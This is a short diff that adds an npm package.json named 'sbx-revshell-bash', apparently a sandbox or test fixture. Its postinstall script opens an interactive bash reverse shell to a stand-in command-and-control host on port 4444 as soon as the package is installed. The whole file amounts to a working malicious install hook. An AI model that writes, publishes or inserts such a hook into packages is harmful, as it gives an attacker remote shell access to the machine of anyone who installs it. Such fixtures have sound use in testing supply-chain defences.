@@ -1,0 +1,5 @@
+{
+  "name": "sbx-revshell-bash",
+  "version": "1.0.0",
+  "scripts": {"postinstall": "bash -c \"bash -i >& /dev/tcp/c2.example.invalid/4444 0>&1\""}
+}
